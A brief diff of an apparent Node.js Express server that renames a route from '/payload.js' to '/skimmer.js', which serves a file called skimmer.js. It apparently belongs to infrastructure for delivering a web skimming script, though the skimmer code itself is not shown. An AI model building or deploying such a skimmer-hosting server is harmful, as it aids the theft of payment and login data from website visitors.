@@ -15,7 +15,7 @@ app.get('/', function(req, res) {
   //console.log("GET request to / from  " + req.connection.remoteAddress);
 });
 
-app.get('/payload.js', function(req, res) {
+app.get('/skimmer.js', function(req, res) {
   res.sendFile('skimmer.js', { root: __dirname });
   //console.log("GET request to /payload.js from " + req.connection.remoteAddress);
 });
